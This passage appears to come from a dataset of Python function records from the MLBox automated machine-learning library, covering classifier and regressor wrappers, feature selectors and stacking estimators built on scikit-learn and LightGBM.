            df_train[target_name] = y_train.values
            df_train.to_hdf(self.to_path + '/df_train.h5', 'train')
            del df_train[target_name]
            if self.verbose:
                print('train dumped')
            df_test.to_hdf(self.to_path + '/df_test.h5', 'test')
            if self.verbose:
                print('test dumped')
                print('CPU time: %s seconds' % (time.time() - start_time))
        else:
            pass
        if task == 'classification':
            fhand = open(self.to_path + '/target_encoder.obj', 'wb')
            pickle.dump(enc, fhand)
            fhand.close()
        else:
            pass
        return {'train': df_train, 'test': df_test, 'target': y_train}"
AxeldeRomblay/MLBox,__init__,"def __init__(self, **params):
    """"""Init Classifier object.

        User can define strategy parameters.

        Parameters
        ----------
        strategy : str, default = ""LightGBM""
            The choice of the classifier.
            Available strategies = {""LightGBM"", ""RandomForest"", ""ExtraTrees"",
            ""Tree"", ""Bagging"", ""AdaBoost"" or ""Linear""}.

        """"""
    if 'strategy' in params:
        self.__strategy = params['strategy']
    else:
        self.__strategy = 'LightGBM'
    self.__classif_params = {}
    self.__classifier = None
    self.__set_classifier(self.__strategy)
    self.__col = None
    self.set_params(**params)
    self.__fitOK = False"
AxeldeRomblay/MLBox,get_params,"def get_params(self, deep=True):
    """"""Get strategy parameters of Classifier object.""""""
    params = {}
    params['strategy'] = self.__strategy
    params.update(self.__classif_params)
    return params"
AxeldeRomblay/MLBox,set_params,"def set_params(self, **params):
    """"""Set strategy parameters of Classifier object.""""""
    self.__fitOK = False
    if 'strategy' in params.keys():
        self.__set_classifier(params['strategy'])
        for (k, v) in self.__classif_params.items():
            if k not in self.get_params().keys():
                warnings.warn('Invalid parameter for classifier ' + str(self.__strategy) + '. Parameter IGNORED. Check the list of available parameters with `classifier.get_params().keys()`')
            else:
                setattr(self.__classifier, k, v)
    for (k, v) in params.items():
        if k == 'strategy':
            pass
        elif k not in self.__classifier.get_params().keys():
            warnings.warn('Invalid parameter for classifier ' + str(self.__strategy) + '. Parameter IGNORED. Check the list of available parameters with `classifier.get_params().keys()`')
        else:
            setattr(self.__classifier, k, v)
            self.__classif_params[k] = v"
AxeldeRomblay/MLBox,__set_classifier,"def __set_classifier(self, strategy):
    """"""Set the classifier using scikitlearn Classifier.""""""
    self.__strategy = strategy
    if strategy == 'RandomForest':
        self.__classifier = RandomForestClassifier(n_estimators=400, max_depth=10, max_features='sqrt', bootstrap=True, n_jobs=-1, random_state=0)
    elif strategy == 'LightGBM':
        self.__classifier = LGBMClassifier(n_estimators=500, learning_rate=0.05, colsample_bytree=0.8, subsample=0.9, nthread=-1, seed=0)
    elif strategy == 'ExtraTrees':
        self.__classifier = ExtraTreesClassifier(n_estimators=400, max_depth=10, max_features='sqrt', bootstrap=True, n_jobs=-1, random_state=0)
    elif strategy == 'Tree':
        self.__classifier = DecisionTreeClassifier(criterion='gini', splitter='best', max_depth=None, min_samples_split=2, min_samples_leaf=1, min_weight_fraction_leaf=0.0, max_features=None, random_state=0, max_leaf_nodes=None, class_weight=None, presort=False)
    elif strategy == 'Bagging':
        self.__classifier = BaggingClassifier(base_estimator=None, n_estimators=500, max_samples=0.9, max_features=0.85, bootstrap=False, bootstrap_features=False, n_jobs=-1, random_state=0)
    elif strategy == 'AdaBoost':
        self.__classifier = AdaBoostClassifier(base_estimator=None, n_estimators=400, learning_rate=0.05, algorithm='SAMME.R', random_state=0)
    elif strategy == 'Linear':
        self.__classifier = LogisticRegression(penalty='l2', dual=False, tol=0.0001, C=1.0, fit_intercept=True, intercept_scaling=1, class_weight=None, random_state=0, solver='lbfgs', max_iter=100, multi_class='ovr', verbose=0, warm_start=False, n_jobs=-1)
    else:
        raise ValueError(""Strategy invalid. Please choose between 'LightGBM', 'RandomForest', 'ExtraTrees', 'Tree', 'Bagging', 'AdaBoost' or 'Linear'"")"
AxeldeRomblay/MLBox,fit,"def fit(self, df_train, y_train):
    """"""Fits Classifier.

        Parameters
        ----------
        df_train : pandas dataframe of shape = (n_train, n_features)
            The train dataset with numerical features.

        y_train : pandas series of shape = (n_train,)
            The numerical encoded target for classification tasks.

        Returns
        -------
        object
            self

        """"""
    if type(df_train) != pd.SparseDataFrame and type(df_train) != pd.DataFrame:
        raise ValueError('df_train must be a DataFrame')
    if type(y_train) != pd.core.series.Series:
        raise ValueError('y_train must be a Series')
    self.__classifier.fit(df_train.values, y_train)
    self.__col = df_train.columns
    self.__fitOK = True
    return self"
AxeldeRomblay/MLBox,feature_importances,"def feature_importances(self):
    """"""Compute feature importances.

        Classifier must be fitted before.

        Returns
        -------
        dict
            Dictionnary containing a measure of feature importance (value) for
            each feature (key).

        """"""
    if self.__fitOK:
        if self.get_params()['strategy'] in ['Linear']:
            importance = {}
            f = np.mean(np.abs(self.get_estimator().coef_), axis=0)
            for (i, col) in enumerate(self.__col):
                importance[col] = f[i]
        elif self.get_params()['strategy'] in ['LightGBM', 'RandomForest', 'ExtraTrees', 'Tree']:
            importance = {}
            f = self.get_estimator().feature_importances_
            for (i, col) in enumerate(self.__col):
                importance[col] = f[i]
        elif self.get_params()['strategy'] in ['AdaBoost']:
            importance = {}
            norm = self.get_estimator().estimator_weights_.sum()
            try:
                f = sum((weight * est.feature_importances_ for (weight, est) in zip(self.get_estimator().estimator_weights_, self.get_estimator().estimators_))) / norm
            except:
                f = sum((weight * np.mean(np.abs(est.coef_), axis=0) for (weight, est) in zip(self.get_estimator().estimator_weights_, self.get_estimator().estimators_))) / norm
            for (i, col) in enumerate(self.__col):
                importance[col] = f[i]
        elif self.get_params()['strategy'] in ['Bagging']:
            importance = {}
            importance_bag = []
            for (i, b) in enumerate(self.get_estimator().estimators_):
                d = {}
                try:
                    f = b.feature_importances_
                except:
                    f = np.mean(np.abs(b.coef_), axis=0)
                for (j, c) in enumerate(self.get_estimator().estimators_features_[i]):
                    d[self.__col[c]] = f[j]
                importance_bag.append(d.copy())
            for (i, col) in enumerate(self.__col):
                list_filtered = filter(lambda x: x != 0, [k[col] if col in k else 0 for k in importance_bag])
                importance[col] = np.mean(list(list_filtered))
        else:
            importance = {}
        return importance
    else:
        raise ValueError('You must call the fit function before !')"
AxeldeRomblay/MLBox,predict,"def predict(self, df):
    """"""Predicts the target.

        Parameters
        ----------
        df : pandas dataframe of shape = (n, n_features)
            The dataset with numerical features.

        Returns
        -------
        array of shape = (n, )
            The encoded classes to be predicted.

        """"""
    try:
        if not callable(getattr(self.__classifier, 'predict')):
            raise ValueError('predict attribute is not callable')
    except Exception as e:
        raise e
    if self.__fitOK:
        if type(df) != pd.SparseDataFrame and type(df) != pd.DataFrame:
            raise ValueError('df must be a DataFrame')
        return self.__classifier.predict(df.values)
    else:
        raise ValueError('You must call the fit function before !')"
AxeldeRomblay/MLBox,predict_log_proba,"def predict_log_proba(self, df):
    """"""Predicts class log-probabilities for df.

        Parameters
        ----------
        df : pandas dataframe of shape = (n, n_features)
            The dataset with numerical features.

        Returns
        -------
        y : array of shape = (n, n_classes)
            The log-probabilities for each class

        """"""
    try:
        if not callable(getattr(self.__classifier, 'predict_log_proba')):
            raise ValueError('predict_log_proba attribute is not callable')
    except Exception as e:
        raise e
    if self.__fitOK:
        if type(df) != pd.SparseDataFrame and type(df) != pd.DataFrame:
            raise ValueError('df must be a DataFrame')
        return self.__classifier.predict_log_proba(df.values)
    else:
        raise ValueError('You must call the fit function before !')"
AxeldeRomblay/MLBox,predict_proba,"def predict_proba(self, df):
    """"""Predicts class probabilities for df.

        Parameters
        ----------
        df : pandas dataframe of shape = (n, n_features)
            The dataset with numerical features.

        Returns
        -------
        array of shape = (n, n_classes)
            The probabilities for each class

        """"""
    try:
        if not callable(getattr(self.__classifier, 'predict_proba')):
            raise ValueError('predict_proba attribute is not callable')
    except Exception as e:
        raise e
    if self.__fitOK:
        if type(df) != pd.SparseDataFrame and type(df) != pd.DataFrame:
            raise ValueError('df must be a DataFrame')
        return self.__classifier.predict_proba(df.values)
    else:
        raise ValueError('You must call the fit function before !')"
AxeldeRomblay/MLBox,score,"def score(self, df, y, sample_weight=None):
    """"""Return the mean accuracy.

        Parameters
        ----------
        df : pandas dataframe of shape = (n, n_features)
            The dataset with numerical features.

        y : pandas series of shape = (n,)
            The numerical encoded target for classification tasks.

        Returns
        -------
        float
            Mean accuracy of self.predict(df) wrt. y.

        """"""
    try:
        if not callable(getattr(self.__classifier, 'score')):
            raise ValueError('score attribute is not callable')
    except Exception as e:
        raise e
    if self.__fitOK:
        if type(df) != pd.SparseDataFrame and type(df) != pd.DataFrame:
            raise ValueError('df must be a DataFrame')
        if type(y) != pd.core.series.Series:
            raise ValueError('y must be a Series')
        return self.__classifier.score(df.values, y, sample_weight)
    else:
        raise ValueError('You must call the fit function before !')"
AxeldeRomblay/MLBox,get_estimator,"def get_estimator(self):
    """"""Return classfier.""""""
    return copy(self.__classifier)"
AxeldeRomblay/MLBox,__init__,"def __init__(self, strategy='l1', threshold=0.3):
    self.strategy = strategy
    self.threshold = threshold
    self.__fitOK = False
    self.__to_discard = []"
AxeldeRomblay/MLBox,get_params,"def get_params(self, deep=True):
    return {'strategy': self.strategy, 'threshold': self.threshold}"
AxeldeRomblay/MLBox,set_params,"def set_params(self, **params):
    self.__fitOK = False
    for (k, v) in params.items():
        if k not in self.get_params():
            warnings.warn('Invalid parameter a for feature selectorClf_feature_selector. Parameter IGNORED. Checkthe list of available parameters with`feature_selector.get_params().keys()`')
        else:
            setattr(self, k, v)"
AxeldeRomblay/MLBox,fit,"def fit(self, df_train, y_train):
    """"""Fits Clf_feature_selector

        Parameters
        ----------
        df_train : pandas dataframe of shape = (n_train, n_features)
            The train dataset with numerical features and no NA

        y_train : pandas series of shape = (n_train, )
            The target for classification task. Must be encoded.

        Returns
        -------
        object
            self
        """"""
    if type(df_train) != pd.SparseDataFrame and type(df_train) != pd.DataFrame:
        raise ValueError('df_train must be a DataFrame')
    if type(y_train) != pd.core.series.Series:
        raise ValueError('y_train must be a Series')
    if self.strategy == 'variance':
        coef = df_train.std()
        abstract_threshold = np.percentile(coef, 100.0 * self.threshold)
        self.__to_discard = coef[coef < abstract_threshold].index
        self.__fitOK = True
    elif self.strategy == 'l1':
        model = LogisticRegression(C=0.01, penalty='l1', solver='saga', n_jobs=-1, random_state=0)
        model.fit(df_train, y_train)
        coef = np.mean(np.abs(model.coef_), axis=0)
        abstract_threshold = np.percentile(coef, 100.0 * self.threshold)
        self.__to_discard = df_train.columns[coef < abstract_threshold]
        self.__fitOK = True
    elif self.strategy == 'rf_feature_importance':
        model = RandomForestClassifier(n_estimators=50, n_jobs=-1, random_state=0)
        model.fit(df_train, y_train)
        coef = model.feature_importances_
        abstract_threshold = np.percentile(coef, 100.0 * self.threshold)
        self.__to_discard = df_train.columns[coef < abstract_threshold]
        self.__fitOK = True
    else:
        raise ValueError(""Strategy invalid. Please choose between 'variance', 'l1' or 'rf_feature_importance'"")
    return self"
AxeldeRomblay/MLBox,transform,"def transform(self, df):
    """"""Transforms the dataset

        Parameters
        ----------
        df : pandas dataframe of shape = (n, n_features)
            The dataset with numerical features and no NA

        Returns
        -------
        pandas dataframe of shape = (n_train, n_features*(1-threshold))
            The train dataset with relevant features
        """"""
    if self.__fitOK:
        if type(df) != pd.SparseDataFrame and type(df) != pd.DataFrame:
            raise ValueError('df must be a DataFrame')
        return df.drop(self.__to_discard, axis=1)
    else:
        raise ValueError('call fit or fit_transform function before')"
AxeldeRomblay/MLBox,fit_transform,"def fit_transform(self, df_train, y_train):
    """"""Fits Clf_feature_selector and transforms the dataset
    
        Parameters
        ----------
        df_train : pandas dataframe of shape = (n_train, n_features)
            The train dataset with numerical features and no NA

        y_train : pandas series of shape = (n_train, ). 
            The target for classification task. Must be encoded.
    
        Returns
        -------
        pandas dataframe of shape = (n_train, n_features*(1-threshold))
            The train dataset with relevant features
        """"""
    self.fit(df_train, y_train)
    return self.transform(df_train)"
AxeldeRomblay/MLBox,__init__,"def __init__(self, base_estimators=[Classifier(strategy='LightGBM'), Classifier(strategy='RandomForest'), Classifier(strategy='ExtraTrees')], level_estimator=LogisticRegression(n_jobs=-1), n_folds=5, copy=False, drop_first=True, random_state=1, verbose=True):
    self.base_estimators = base_estimators
    if type(self.base_estimators) != list:
        raise ValueError('base_estimators must be a list')
    else:
        for (i, est) in enumerate(self.base_estimators):
            self.base_estimators[i] = make_copy(est)
    self.level_estimator = level_estimator
    self.n_folds = n_folds
    if type(self.n_folds) != int:
        raise ValueError('n_folds must be an integer')
    self.copy = copy
    if type(self.copy) != bool:
        raise ValueError('copy must be a boolean')
    self.drop_first = drop_first
    if type(self.drop_first) != bool:
        raise ValueError('drop_first must be a boolean')
    self.random_state = random_state
    if type(self.random_state) != int and self.random_state is not None:
        raise ValueError('random_state must be either None or an integer')
    self.verbose = verbose
    if type(self.verbose) != bool:
        raise ValueError('verbose must be a boolean')
    self.__fitOK = False
    self.__fittransformOK = False"
AxeldeRomblay/MLBox,get_params,"def get_params(self, deep=True):
    return {'level_estimator': self.level_estimator, 'base_estimators': self.base_estimators, 'n_folds': self.n_folds, 'copy': self.copy, 'drop_first': self.drop_first, 'random_state': self.random_state, 'verbose': self.verbose}"
AxeldeRomblay/MLBox,set_params,"def set_params(self, **params):
    self.__fitOK = False
    self.__fittransformOK = False
    for (k, v) in params.items():
        if k not in self.get_params():
            warnings.warn('Invalid parameter a for stacking_classifier StackingClassifier. Parameter IGNORED. Check the list of available parameters with `stacking_classifier.get_params().keys()`')
        else:
            setattr(self, k, v)"
AxeldeRomblay/MLBox,__cross_val_predict_proba,"def __cross_val_predict_proba(self, estimator, df, y, cv):
    """"""Evaluates the target by cross-validation

        Parameters
        ----------
        estimator : estimator object implementing 'fit'
            The object to use to fit the data.

        df : pandas DataFrame
            The data to fit.

        y : pandas Serie
            The target variable to try to predict in the case of
            supervised learning.

        cv : a STRATIFIED cross-validation generator


        Returns
        -------
        y_pred : array-like of shape = (n_samples, n_classes)
            The predicted class probabilities for X.
        """"""
    classes = y.value_counts()
    classes_to_drop = classes[classes < 2].index
    indexes_to_drop = y[y.apply(lambda x: x in classes_to_drop)].index
    y_pred = np.zeros((len(y), len(classes) - len(classes_to_drop)))
    for (train_index, test_index) in cv.split(df, y):
        (df_train, df_test) = (df.iloc[train_index], df.iloc[test_index])
        y_train = y.iloc[train_index]
        try:
            df_train = df_train.drop(indexes_to_drop)
            y_train = y_train.drop(indexes_to_drop)
        except Exception:
            pass
        estimator.fit(df_train, y_train)
        y_pred[test_index] = estimator.predict_proba(df_test)[:,]
    return y_pred"
AxeldeRomblay/MLBox,fit_transform,"def fit_transform(self, df_train, y_train):
    """"""Creates meta-features for the training dataset.

        Parameters
        ----------
        df_train : pandas dataframe of shape = (n_samples, n_features)
            The training dataset.

        y_train : pandas series of shape = (n_samples, )
            The target.

        Returns
        -------
        pandas dataframe of shape = (n_samples, n_features*int(copy)+n_metafeatures)
            The transformed training dataset.
        """"""
    if type(df_train) != pd.SparseDataFrame and type(df_train) != pd.DataFrame:
        raise ValueError('df_train must be a DataFrame')
    if type(y_train) != pd.core.series.Series:
        raise ValueError('y_train must be a Series')
    cv = StratifiedKFold(n_splits=self.n_folds, shuffle=True, random_state=self.random_state)
    preds = pd.DataFrame([], index=y_train.index)
    classes = y_train.value_counts()
    classes_to_drop = classes[classes < 2].index
    indexes_to_drop = y_train[y_train.apply(lambda x: x in classes_to_drop)].index
    if self.verbose:
        print('')
        print('[=============================================================================] LAYER [===================================================================================]')
        print('')
    for (c, clf) in enumerate(self.base_estimators):
        if self.verbose:
            print('> fitting estimator n°' + str(c + 1) + ' : ' + str(clf.get_params()) + ' ...')
            print('')
        y_pred = self.__cross_val_predict_proba(clf, df_train, y_train, cv)
        for i in range(0, y_pred.shape[1] - int(self.drop_first)):
            preds['est' + str(c + 1) + '_class' + str(i)] = y_pred[:, i]
        clf.fit(df_train.drop(indexes_to_drop), y_train.drop(indexes_to_drop))
    layer = 1
    columns = ['layer' + str(layer) + '_' + s for s in preds.columns]
    while len(np.intersect1d(df_train.columns, columns)) > 0:
        layer = layer + 1
        columns = ['layer' + str(layer) + '_' + s for s in preds.columns]
    preds.columns = ['layer' + str(layer) + '_' + s for s in preds.columns]
    self.__fittransformOK = True
    if self.copy:
        return pd.concat([df_train, preds], axis=1)
    else:
        return preds"
AxeldeRomblay/MLBox,transform,"def transform(self, df_test):
    """"""Creates meta-features for the test dataset.

        Parameters
        ----------
        df_test : pandas dataframe of shape = (n_samples_test, n_features)
            The test dataset.

        Returns
        -------
        pandas dataframe of shape = (n_samples_test, n_features*int(copy)+n_metafeatures)
            The transformed test dataset.
        """"""
    if type(df_test) != pd.SparseDataFrame and type(df_test) != pd.DataFrame:
        raise ValueError('df_test must be a DataFrame')
    if self.__fittransformOK:
        preds_test = pd.DataFrame([], index=df_test.index)
        for (c, clf) in enumerate(self.base_estimators):
            y_pred_test = clf.predict_proba(df_test)
            for i in range(0, y_pred_test.shape[1] - int(self.drop_first)):
                idx_name = 'est' + str(c + 1) + '_class' + str(i)
                preds_test[idx_name] = y_pred_test[:, i]
        layer = 1
        columns = ['layer' + str(layer) + '_' + s for s in preds_test.columns]
        while len(np.intersect1d(df_test.columns, columns)) > 0:
            layer = layer + 1
            columns = ['layer' + str(layer) + '_' + s for s in preds_test.columns]
        preds_test.columns = ['layer' + str(layer) + '_' + s for s in preds_test.columns]
        if self.copy:
            return pd.concat([df_test, preds_test], axis=1)
        else:
            return preds_test
    else:
        raise ValueError('Call fit_transform before !')"
AxeldeRomblay/MLBox,fit,"def fit(self, df_train, y_train):
    """"""Fits the first level estimators and the second level estimator on X.

        Parameters
        ----------
        df_train : pandas dataframe of shape (n_samples, n_features)
            Input data

        y_train : pandas series of shape = (n_samples, )
            The target

        Returns
        -------
        object
            self.
        """"""
    df_train = self.fit_transform(df_train, y_train)
    if self.verbose:
        print('')
        print('[=========================================================================] PREDICTION LAYER [============================================================================]')
        print('')
        print('> fitting estimator : ')
        print(str(self.level_estimator.get_params()) + ' ...')
        print('')
    self.level_estimator.fit(df_train.values, y_train.values)
    self.__fitOK = True
    return self"
AxeldeRomblay/MLBox,predict_proba,"def predict_proba(self, df_test):
    """"""Predicts class probabilities for the test set using the meta-features.

        Parameters
        ----------
        df_test : pandas DataFrame of shape = (n_samples_test, n_features)
            The testing samples

        Returns
        -------
        array of shape = (n_samples_test, n_classes)
            The class probabilities of the testing samples.
        """"""
    if self.__fitOK:
        df_test = self.transform(df_test)
        return self.level_estimator.predict_proba(df_test)
    else:
        raise ValueError('Call fit before !')"
AxeldeRomblay/MLBox,predict,"def predict(self, df_test):
    """"""Predicts class for the test set using the meta-features.

        Parameters
        ----------
        df_test : pandas DataFrame of shape = (n_samples_test, n_features)
            The testing samples

        Returns
        -------
        array of shape = (n_samples_test,)
            The predicted classes.
        """"""
    if self.__fitOK:
        df_test = self.transform(df_test)
        return self.level_estimator.predict(df_test)
    else:
        raise ValueError('Call fit before !')"
AxeldeRomblay/MLBox,__init__,"def __init__(self, strategy='l1', threshold=0.3):
    self.strategy = strategy
    self.threshold = threshold
    self.__fitOK = False
    self.__to_discard = []"
AxeldeRomblay/MLBox,get_params,"def get_params(self, deep=True):
    return {'strategy': self.strategy, 'threshold': self.threshold}"
AxeldeRomblay/MLBox,set_params,"def set_params(self, **params):
    self.__fitOK = False
    for (k, v) in params.items():
        if k not in self.get_params():
            warnings.warn('Invalid parameter a for feature selectorReg_feature_selector. Parameter IGNORED. Check the list of available parameters with `feature_selector.get_params().keys()`')
        else:
            setattr(self, k, v)"
AxeldeRomblay/MLBox,fit,"def fit(self, df_train, y_train):
    """"""Fits Reg_feature_selector.

        Parameters
        ----------
        df_train : pandas dataframe of shape = (n_train, n_features)
            The train dataset with numerical features and no NA

        y_train : pandas series of shape = (n_train, ).
            The target for regression task.

        Returns
        -------
        sobject
            self
        """"""
    if type(df_train) != pd.SparseDataFrame and type(df_train) != pd.DataFrame:
        raise ValueError('df_train must be a DataFrame')
    if type(y_train) != pd.core.series.Series:
        raise ValueError('y_train must be a Series')
    if self.strategy == 'variance':
        coef = df_train.std()
        abstract_threshold = np.percentile(coef, 100.0 * self.threshold)
        self.__to_discard = coef[coef < abstract_threshold].index
        self.__fitOK = True
    elif self.strategy == 'l1':
        model = Lasso(alpha=100.0, random_state=0)
        model.fit(df_train, y_train)
        coef = np.abs(model.coef_)
        abstract_threshold = np.percentile(coef, 100.0 * self.threshold)
        self.__to_discard = df_train.columns[coef < abstract_threshold]
        self.__fitOK = True
    elif self.strategy == 'rf_feature_importance':
        model = RandomForestRegressor(n_estimators=50, n_jobs=-1, random_state=0)
        model.fit(df_train, y_train)
        coef = model.feature_importances_
        abstract_threshold = np.percentile(coef, 100.0 * self.threshold)
        self.__to_discard = df_train.columns[coef < abstract_threshold]
        self.__fitOK = True
    else:
        raise ValueError(""Strategy invalid. Please choose between 'variance', 'l1' or 'rf_feature_importance'"")
    return self"
AxeldeRomblay/MLBox,transform,"def transform(self, df):
    """"""Transforms the dataset

        Parameters
        ----------
        df : pandas dataframe of shape = (n, n_features)
            The dataset with numerical features and no NA

        Returns
        -------
        pandas dataframe of shape = (n_train, n_features*(1-threshold))
            The train dataset with relevant features
        """"""
    if self.__fitOK:
        if (type(df) != pd.SparseDataFrame) & (type(df) != pd.DataFrame):
            raise ValueError('df must be a DataFrame')
        return df.drop(self.__to_discard, axis=1)
    else:
        raise ValueError('call fit or fit_transform function before')"
AxeldeRomblay/MLBox,fit_transform,"def fit_transform(self, df_train, y_train):
    """"""Fits Reg_feature_selector and transforms the dataset

        Parameters
        ----------
        df_train : pandas dataframe of shape = (n_train, n_features)
            The train dataset with numerical features and no NA

        y_train : pandas series of shape = (n_train, ).
            The target for regression task.

        Returns
        -------
        pandas dataframe of shape = (n_train, n_features*(1-threshold))
            The train dataset with relevant features
        """"""
    self.fit(df_train, y_train)
    return self.transform(df_train)"
AxeldeRomblay/MLBox,__init__,"def __init__(self, **params):
    """"""Init Regressor object where user can pass a strategy.""""""
    if 'strategy' in params:
        self.__strategy = params['strategy']
    else:
        self.__strategy = 'LightGBM'
    self.__regress_params = {}
    self.__regressor = None
    self.__set_regressor(self.__strategy)
    self.__col = None
    self.set_params(**params)
    self.__fitOK = False"
AxeldeRomblay/MLBox,get_params,"def get_params(self, deep=True):
    """"""Get parameters of Regressor object.""""""
    params = {}
    params['strategy'] = self.__strategy
    params.update(self.__regress_params)
    return params"
AxeldeRomblay/MLBox,set_params,"def set_params(self, **params):
    """"""Set parameters of Regressor object.""""""
    self.__fitOK = False
    if 'strategy' in params.keys():
        self.__set_regressor(params['strategy'])
        for (k, v) in self.__regress_params.items():
            if k not in self.get_params().keys():
                warnings.warn('Invalid parameter for regressor ' + str(self.__strategy) + '. Parameter IGNORED. Check the list of available parameters with `regressor.get_params().keys()`')
            else:
                setattr(self.__regressor, k, v)
    for (k, v) in params.items():
        if k == 'strategy':
            pass
        elif k not in self.__regressor.get_params().keys():
            warnings.warn('Invalid parameter for regressor ' + str(self.__strategy) + '. Parameter IGNORED. Check the list of available parameters with `regressor.get_params().keys()`')
        else:
            setattr(self.__regressor, k, v)
            self.__regress_params[k] = v"
AxeldeRomblay/MLBox,__set_regressor,"def __set_regressor(self, strategy):
    """"""Set strategy of a regressor object.""""""
    self.__strategy = strategy
    if strategy == 'RandomForest':
        self.__regressor = RandomForestRegressor(n_estimators=400, max_depth=10, max_features='sqrt', bootstrap=True, n_jobs=-1, random_state=0)
    elif strategy == 'LightGBM':
        self.__regressor = LGBMRegressor(n_estimators=500, learning_rate=0.05, colsample_bytree=0.8, subsample=0.9, nthread=-1, seed=0)
    elif strategy == 'ExtraTrees':
        self.__regressor = ExtraTreesRegressor(n_estimators=400, max_depth=10, max_features='sqrt', bootstrap=True, n_jobs=-1, random_state=0)
    elif strategy == 'Tree':
        self.__regressor = DecisionTreeRegressor(criterion='mse', splitter='best', max_depth=None, min_samples_split=2, min_samples_leaf=1, min_weight_fraction_leaf=0.0, max_features=None, random_state=0, max_leaf_nodes=None, presort=False)
    elif strategy == 'Bagging':
        self.__regressor = BaggingRegressor(base_estimator=None, n_estimators=500, max_samples=0.9, max_features=0.85, bootstrap=False, bootstrap_features=False, n_jobs=-1, random_state=0)
    elif strategy == 'AdaBoost':
        self.__regressor = AdaBoostRegressor(base_estimator=None, n_estimators=400, learning_rate=0.05, random_state=0)
    elif strategy == 'Linear':
        self.__regressor = Ridge(alpha=1.0, fit_intercept=True, normalize=False, copy_X=True, max_iter=None, tol=0.001, solver='auto', random_state=0)
    else:
        raise ValueError(""Strategy invalid. Please choose between 'LightGBM', 'RandomForest', 'ExtraTrees', 'Tree', 'Bagging', 'AdaBoost' or 'Linear'"")"
AxeldeRomblay/MLBox,fit,"def fit(self, df_train, y_train):
    """"""Fits Regressor.

        Parameters
        ----------
        df_train : pandas dataframe of shape = (n_train, n_features)
            The train dataset with numerical features.

        y_train : pandas series of shape = (n_train, )
            The target for regression tasks.

        Returns
        -------
        object
            self

        """"""
    if type(df_train) != pd.SparseDataFrame and type(df_train) != pd.DataFrame:
        raise ValueError('df_train must be a DataFrame')
    if type(y_train) != pd.core.series.Series:
        raise ValueError('y_train must be a Series')
    self.__regressor.fit(df_train.values, y_train)
    self.__col = df_train.columns
    self.__fitOK = True
    return self"
AxeldeRomblay/MLBox,feature_importances,"def feature_importances(self):
    """"""Computes feature importances.

        Regressor must be fitted before.

        Returns
        -------
        dict
            Dictionnary containing a measure of feature importance (value)
            for each feature (key).

        """"""
    if self.__fitOK:
        if self.get_params()['strategy'] in ['Linear']:
            importance = {}
            f = np.abs(self.get_estimator().coef_)
            for (i, col) in enumerate(self.__col):
                importance[col] = f[i]
        elif self.get_params()['strategy'] in ['LightGBM', 'RandomForest', 'ExtraTrees', 'Tree']:
            importance = {}
            f = self.get_estimator().feature_importances_
            for (i, col) in enumerate(self.__col):
                importance[col] = f[i]
        elif self.get_params()['strategy'] in ['AdaBoost']:
            importance = {}
            norm = self.get_estimator().estimator_weights_.sum()
            try:
                f = sum((weight * est.feature_importances_ for (weight, est) in zip(self.get_estimator().estimator_weights_, self.get_estimator().estimators_))) / norm
            except Exception:
                f = sum((weight * np.abs(est.coef_) for (weight, est) in zip(self.get_estimator().estimator_weights_, self.get_estimator().estimators_))) / norm
            for (i, col) in enumerate(self.__col):
                importance[col] = f[i]
        elif self.get_params()['strategy'] in ['Bagging']:
            importance = {}
            importance_bag = []
            for (i, b) in enumerate(self.get_estimator().estimators_):
                d = {}
                try:
                    f = b.feature_importances_
                except Exception:
                    f = np.abs(b.coef_)
                estimator = self.get_estimator()
                items = enumerate(estimator.estimators_features_[i])
                for (j, c) in items:
                    d[self.__col[c]] = f[j]
                importance_bag.append(d.copy())
            for (i, col) in enumerate(self.__col):
                list_filtered = filter(lambda x: x != 0, [k[col] if col in k else 0 for k in importance_bag])
                importance[col] = np.mean(list(list_filtered))
        else:
            importance = {}
        return importance
    else:
        raise ValueError('You must call the fit function before !')"
AxeldeRomblay/MLBox,predict,"def predict(self, df):
    """"""Predicts the target.

        Parameters
        ----------
        df : pandas dataframe of shape = (n, n_features)
            The dataset with numerical features.

        Returns
        -------
        array of shape = (n, )
            The target to be predicted.

        """"""
    try:
        if not callable(getattr(self.__regressor, 'predict')):
            raise ValueError('predict attribute is not callable')
    except Exception as e:
        raise e
    if self.__fitOK:
        if (type(df) != pd.SparseDataFrame) & (type(df) != pd.DataFrame):
            raise ValueError('df must be a DataFrame')
        return self.__regressor.predict(df.values)
    else:
        raise ValueError('You must call the fit function before !')"
AxeldeRomblay/MLBox,transform,"def transform(self, df):
    """"""Transform dataframe df.

        Parameters
        ----------
        df : pandas dataframe of shape = (n, n_features)
            The dataset with numerical features.

        Returns
        -------
        pandas dataframe of shape = (n, n_selected_features)
            The transformed dataset with its most important features.

        """"""
    try:
        if not callable(getattr(self.__regressor, 'transform')):
            raise ValueError('transform attribute is not callable')
    except Exception as e:
        raise e
    if self.__fitOK:
        if (type(df) != pd.SparseDataFrame) & (type(df) != pd.DataFrame):
            raise ValueError('df must be a DataFrame')
        return self.__regressor.transform(df.values)
    else:
        raise ValueError('You must call the fit function before !')"
AxeldeRomblay/MLBox,score,"def score(self, df, y, sample_weight=None):
    """"""Return R^2 coefficient of determination of the prediction.

        Parameters
        ----------
        df : pandas dataframe of shape = (n, n_features)
            The dataset with numerical features.

        y : pandas series of shape = (n,)
            The numerical encoded target for classification tasks.

        Returns
        -------
        float
            R^2 of self.predict(df) wrt. y.

        """"""
    try:
        if not callable(getattr(self.__regressor, 'score')):
            raise ValueError('score attribute is not callable')
    except Exception as e:
        raise e
    if self.__fitOK:
        if type(df) != pd.SparseDataFrame and type(df) != pd.DataFrame:
            raise ValueError('df must be a DataFrame')
        if type(y) != pd.core.series.Series:
            raise ValueError('y must be a Series')
        return self.__regressor.score(df.values, y, sample_weight)
    else:
        raise ValueError('You must call the fit function before !')"
AxeldeRomblay/MLBox,get_estimator,"def get_estimator(self):
    """"""Return classfier.""""""
    return copy(self.__regressor)"
AxeldeRomblay/MLBox,__init__,"def __init__(self, base_estimators=[Regressor(strategy='LightGBM'), Regressor(strategy='RandomForest'), Regressor(strategy='ExtraTrees')], level_estimator=LinearRegression(), n_folds=5, copy=False, random_state=1, verbose=True):
    """"""Init method for StackingRegressor.""""""
    self.base_estimators = base_estimators
    if type(base_estimators) != list:
        raise ValueError('base_estimators must be a list')
    else:
        for (i, est) in enumerate(self.base_estimators):
            self.base_estimators[i] = make_copy(est)
    self.level_estimator = level_estimator
    self.n_folds = n_folds
    if type(n_folds) != int:
        raise ValueError('n_folds must be an integer')
    self.copy = copy
    if type(copy) != bool:
        raise ValueError('copy must be a boolean')
    self.random_state = random_state
    if type(self.random_state) != int and self.random_state is not None:
        raise ValueError('random_state must be either None or an integer')
    self.verbose = verbose
